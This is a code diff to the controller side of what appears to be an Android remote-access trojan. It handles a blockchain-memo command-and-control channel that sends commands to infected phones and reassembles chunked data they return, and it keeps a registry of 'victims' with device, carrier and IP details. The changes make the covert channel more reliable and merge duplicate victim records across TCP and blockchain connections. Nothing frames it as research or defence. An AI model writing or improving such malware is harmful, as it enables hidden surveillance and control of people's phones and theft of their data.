@@ -866,6 +866,7 @@ let blockchainPollerInterval = null;
 let blockchainListening = false;
 let blockchainSeenSignatures = new Set();
 const blockchainVictims = new Set(); // Track known blockchain client IDs
+let blockchainSessionArmed = false; // Ignore old memos until a fresh heartbeat/init arrives
 
 // Load blockchain dependencies
 let bs58Main, ConnectionMain, PublicKeyMain, cryptoMain;
@@ -972,9 +973,10 @@ function extractMemosFromTxMain(tx) {
 // Chunk buffers for assembling multi-part responses
 const blockchainChunkBuffers = new Map();
 const completedChunkTransfers = new Set(); // Track completed chunk transfers to prevent reprocessing
+const completedChunkLogOnce = new Set(); // Avoid spamming late-chunk logs for already-finished transfers
 
 // Track RPC rate limits and rotation
-let rpcRateLimitMap = new Map(); // rpc -> { last429: timestamp, consecutive429s: count }
+let rpcRateLimitMap = new Map(); // rpc -> { last429: timestamp, consecutive429s: count, lastLog: timestamp }
 let currentRpcIndex = 0;
 let lastPollTime = 0;
 const MIN_POLL_INTERVAL = 15000; // Minimum 15 seconds between polls
@@ -1422,6 +1424,15 @@ async function pollBlockchainForClients(config) {
         for (const memo of memos) {
           if (!memo) continue;
           
+          // Wait for fresh heartbeat/init after starting listener to avoid old memos
+          const isHeartbeatOrInit = memo.startsWith('HB:') || memo.startsWith('INIT:');
+          if (!blockchainSessionArmed && !isHeartbeatOrInit) {
+            continue;
+          }
+          if (isHeartbeatOrInit) {
+            blockchainSessionArmed = true;
+          }
+          
           // Log all memos for debugging
           if (memo.startsWith('CMD:')) {
             sendBlockchainLog(`[→] Outgoing command: ${memo.substring(0, 50)}...`);
@@ -1461,8 +1472,12 @@ async function pollBlockchainForClients(config) {
               
               // CRITICAL: Ignore chunks for already-completed transfers - check FIRST before any processing
               if (completedChunkTransfers.has(chunkId)) {
-                log.info(`[Blockchain] Ignoring chunk ${part}/${total} for already-completed transfer ${chunkId} (transfer was already assembled and processed)`);
-                sendBlockchainLog(`[ℹ] Ignoring late chunk ${part}/${total} for completed transfer ${chunkId}`);
+                // Only log once per completed transfer to prevent console/terminal spam
+                if (!completedChunkLogOnce.has(chunkId)) {
+                  completedChunkLogOnce.add(chunkId);
+                  log.info(`[Blockchain] Transfer ${chunkId} already completed; skipping any late chunks`);
+                  sendBlockchainLog(`[ℹ] Transfer ${chunkId} already completed; skipping late chunks`);
+                }
                 continue; // Skip this chunk entirely - don't process it
               }
               
@@ -1749,16 +1764,25 @@ async function pollBlockchainForClients(config) {
     
     if (is429) {
       // Track rate limiting
-      const rateLimit = rpcRateLimitMap.get(rpc) || { last429: 0, consecutive429s: 0 };
-      rateLimit.last429 = Date.now();
+      const rateLimit = rpcRateLimitMap.get(rpc) || { last429: 0, consecutive429s: 0, lastLog: 0 };
+      const nowTs = Date.now();
+      rateLimit.last429 = nowTs;
       rateLimit.consecutive429s++;
-      rpcRateLimitMap.set(rpc, rateLimit);
-      
-      sendBlockchainLog(`[⚠] RPC ${rpc.substring(0, 30)}... rate-limited (429). Rotating to next RPC...`);
-      log.warn(`[Blockchain] RPC ${rpc} rate-limited (429), consecutive: ${rateLimit.consecutive429s}`);
       
       // Add exponential backoff delay
       const backoffDelay = Math.min(5000 * Math.pow(2, rateLimit.consecutive429s - 1), 30000);
+      
+      // Log 429s sparingly to avoid spammy output
+      const shouldLog429 = !rateLimit.lastLog || (nowTs - rateLimit.lastLog) > 5000;
+      if (shouldLog429) {
+        const shortRpc = rpc.length > 40 ? `${rpc.substring(0, 30)}...` : rpc;
+        const conciseMsg = `[429] ${shortRpc} (#${rateLimit.consecutive429s}) backoff ${backoffDelay}ms`;
+        log.warn(`[Blockchain] ${conciseMsg}`);
+        sendBlockchainLog(`[ℹ] ${conciseMsg}`);
+        rateLimit.lastLog = nowTs;
+      }
+      
+      rpcRateLimitMap.set(rpc, rateLimit);
       await new Promise(resolve => setTimeout(resolve, backoffDelay));
     } else {
       log.warn(`[Blockchain] RPC ${rpc} failed: ${errorMsg}`);
@@ -1836,6 +1860,76 @@ function processBlockchainResponse(decrypted, signature, sendLog) {
         clientId = signature.substring(0, 16);
         // instrumentation removed
       }
+    }
+
+    // Helper: try to map blockchain response to an existing non-blockchain victim (same device)
+    const tryFindExistingDeviceId = () => {
+      const hardwareId = data.id || data.deviceId || data.androidId || data.android_id || data.uuid;
+      if (hardwareId && hardwareId !== clientId) return hardwareId;
+      const allVictims = victimsList.getAllVictims();
+      let bestId = null;
+      let bestScore = 0;
+      for (const [vid, v] of Object.entries(allVictims)) {
+        if (!v || v === -1) continue;
+        if (v.connectionType === 'blockchain' || v.conn === 'blockchain') continue;
+        let score = 0;
+        const cmp = (a, b) => a && b && String(a).toLowerCase() === String(b).toLowerCase();
+        if (cmp(v.manf, data.manf || data.manufacturer || data.brand)) score++;
+        if (cmp(v.model, data.model)) score++;
+        if (cmp(v.release, data.release || data.version || data.androidVersion)) score++;
+        if (cmp(v.operator, data.operator)) score++;
+        if (cmp(v.device, data.device || data.deviceName)) score++;
+        if (cmp(v.brand, data.brand)) score++;
+        if (cmp(v.product, data.product)) score++;
+        if (cmp(v.sdk, data.sdk || data.androidSdk)) score++;
+        if (cmp(v.ip, data.ip) || cmp(v.ip, 'Blockchain')) score += 2; // strong hint (same session/ip)
+        if (v.port && data.port && String(v.port) === String(data.port)) score++;
+        if (score > bestScore) {
+          bestScore = score;
+          bestId = vid;
+        }
+      }
+      // Require a reasonable match to avoid false positives
+      return bestScore >= 3 ? bestId : null;
+    };
+
+    // Merge blockchain connection with existing TCP/IP entry when they are the same device
+    const candidateId = tryFindExistingDeviceId();
+    if (candidateId && candidateId !== clientId) {
+      // Remove any prior wallet-only entry to avoid duplicates
+      const walletVictim = victimsList.getVictim(clientId);
+      if (walletVictim && walletVictim !== -1) {
+        victimsList.rmVictim(clientId);
+        blockchainVictims.delete(clientId);
+      }
+      clientId = candidateId; // Use existing device entry as canonical
+      
+      // Update the existing victim to mark it as blockchain if it's currently TCP/IP
+      const existingVictim = victimsList.getVictim(clientId);
+      if (existingVictim && existingVictim !== -1) {
+        // If existing victim is TCP/IP and we're receiving blockchain data, update connection type
+        const isCurrentlyTCP = (
+          existingVictim.connectionType !== 'blockchain' &&
+          existingVictim.conn !== 'blockchain' &&
+          existingVictim.ip !== 'Blockchain' &&
+          existingVictim.country !== 'BC'
+        );
+        
+        if (isCurrentlyTCP) {
+          // Update to blockchain connection type since we're receiving blockchain data
+          existingVictim.isBlockchain = true;
+          existingVictim.connectionType = 'blockchain';
+          existingVictim.conn = 'blockchain';
+          existingVictim.country = 'BC';
+          existingVictim.ip = 'Blockchain';
+          if (!existingVictim.walletAddress) {
+            existingVictim.walletAddress = clientId;
+          }
+          log.info(`[Blockchain] Updated existing TCP/IP client ${clientId.substring(0, 8)}... to blockchain connection type`);
+        }
+      }
+      
+      sendLog(`[ℹ] Merged blockchain client into existing device ${clientId.substring(0, 8)}…`);
     }
 
   // instrumentation removed
@@ -1999,13 +2093,26 @@ function processBlockchainResponse(decrypted, signature, sendLog) {
         }
         
         // Preserve blockchain properties for blockchain victims
-        if (victim.country === 'BC' || victim.ip === 'Blockchain') {
+        // Check multiple indicators to ensure blockchain clients are properly identified
+        const isBlockchainClient = (
+          victim.country === 'BC' || 
+          victim.ip === 'Blockchain' ||
+          victim.isBlockchain === true ||
+          victim.connectionType === 'blockchain' ||
+          victim.conn === 'blockchain' ||
+          (victim.socket && victim.socket.isBlockchain === true) ||
+          (victim.socket && victim.socket.connectionType === 'blockchain')
+        );
+        
+        if (isBlockchainClient) {
           if (!victim.walletAddress) {
             victim.walletAddress = clientId;
           }
           victim.isBlockchain = true;
           victim.connectionType = 'blockchain';
           victim.conn = 'blockchain';
+          victim.country = 'BC';
+          victim.ip = 'Blockchain';
         }
         
         // Ensure victim is marked as online
@@ -2130,18 +2237,76 @@ function processBlockchainResponse(decrypted, signature, sendLog) {
         conn: 'blockchain'
       };
 
-      // Add victim to list
-      victimsList.addVictim(
-        blockchainSocket,
-        'Blockchain',
-        0,
-        'BC',
-        data.manf || data.manufacturer || data.brand || 'Unknown',
-        data.model || 'Blockchain Client',
-        data.release || data.version || data.androidVersion || 'Unknown',
-        clientId,
-        deviceInfo
-      );
+      // If victim already exists (offline TCP/IP entry, etc.), reuse and update instead of duplicating
+      const existingVictim = victimsList.getVictim(clientId);
+      if (existingVictim && existingVictim !== -1) {
+        // Check if this is a duplicate (same device, different connection mode)
+        const isDuplicate = (
+          existingVictim.connectionType !== 'blockchain' &&
+          existingVictim.conn !== 'blockchain' &&
+          existingVictim.ip !== 'Blockchain' &&
+          existingVictim.country !== 'BC'
+        );
+        
+        if (isDuplicate && existingVictim.isOnline) {
+          // If existing TCP/IP victim is online, prefer it and mark as blockchain
+          // This ensures we don't create duplicates
+          existingVictim.socket = blockchainSocket;
+          existingVictim.ip = 'Blockchain';
+          existingVictim.port = 0;
+          existingVictim.country = 'BC';
+          existingVictim.isOnline = true;
+          existingVictim.lastSeen = Date.now();
+          Object.assign(existingVictim, deviceInfo, {
+            connectionType: 'blockchain',
+            conn: 'blockchain',
+            isBlockchain: true
+          });
+          victimsList.updateVictim(clientId, existingVictim);
+          log.info(`[Blockchain] Updated existing online TCP/IP client ${clientId.substring(0, 8)}... to blockchain`);
+        } else if (isDuplicate && !existingVictim.isOnline) {
+          // If existing TCP/IP victim is offline, replace with blockchain (online) entry
+          existingVictim.socket = blockchainSocket;
+          existingVictim.ip = 'Blockchain';
+          existingVictim.port = 0;
+          existingVictim.country = 'BC';
+          existingVictim.isOnline = true;
+          existingVictim.lastSeen = Date.now();
+          Object.assign(existingVictim, deviceInfo, {
+            connectionType: 'blockchain',
+            conn: 'blockchain',
+            isBlockchain: true
+          });
+          victimsList.updateVictim(clientId, existingVictim);
+          log.info(`[Blockchain] Replaced offline TCP/IP client ${clientId.substring(0, 8)}... with blockchain connection`);
+        } else {
+          // Already a blockchain victim, just update
+          existingVictim.socket = blockchainSocket;
+          existingVictim.ip = 'Blockchain';
+          existingVictim.port = 0;
+          existingVictim.country = 'BC';
+          existingVictim.isOnline = true;
+          existingVictim.lastSeen = Date.now();
+          Object.assign(existingVictim, deviceInfo, {
+            connectionType: 'blockchain',
+            conn: 'blockchain',
+            isBlockchain: true
+          });
+          victimsList.updateVictim(clientId, existingVictim);
+        }
+      } else {
+        victimsList.addVictim(
+          blockchainSocket,
+          'Blockchain',
+          0,
+          'BC',
+          data.manf || data.manufacturer || data.brand || 'Unknown',
+          data.model || 'Blockchain Client',
+          data.release || data.version || data.androidVersion || 'Unknown',
+          clientId,
+          deviceInfo
+        );
+      }
 
       log.success(`[Blockchain] New client registered: ${clientId} (from ${eventName} response)`);
       sendLog(`[✓] New blockchain client registered: ${clientId}`);
@@ -2187,6 +2352,7 @@ ipcMain.on('Blockchain:Listen', function (event, config) {
   rpcRateLimitMap.clear();
   currentRpcIndex = 0;
   blockchainListenerStartTime = Date.now(); // Track when we started to filter old transactions
+  blockchainSessionArmed = false; // Wait for new heartbeat/init after listen starts
   
   const sendBlockchainLog = (msg) => {
     if (win && win.webContents) {
@@ -2337,7 +2503,18 @@ ipcMain.on('openLabWindow', function (e, page, index) {
   child.webContents.openDevTools();
 
   // pass the victim info to this victim lab with logging wrapper
-  const originalSocket = victimsList.getVictim(index).socket;
+  const victim = victimsList.getVictim(index);
+  if (!victim) {
+    log.error(`Cannot open lab window: victim ${index} not found`);
+    event.reply('openLabWindow:error', `Victim ${index} not found`);
+    return;
+  }
+  if (!victim.socket) {
+    log.error(`Cannot open lab window: victim ${index} has no socket`);
+    event.reply('openLabWindow:error', `Victim ${index} has no active connection`);
+    return;
+  }
+  const originalSocket = victim.socket;
   const victimId = index;
   
   // Wrap socket to add logging for all emits
@@ -2372,7 +2549,9 @@ ipcMain.on('openLabWindow', function (e, page, index) {
     });
   };
   
+  // Pass both socket and full victim object to lab window
   child.webContents.victim = originalSocket;
+  child.webContents.victimData = victim; // Full victim object with connection info
   child.loadFile(__dirname + '/app/' + page)
 
   child.once('ready-to-show', () => {
@@ -2720,5 +2899,3 @@ ipcMain.on('fullscreen-input', (event, data) => {
   
   log.warn('Could not find parent window to forward fullscreen input');
 });
-
-
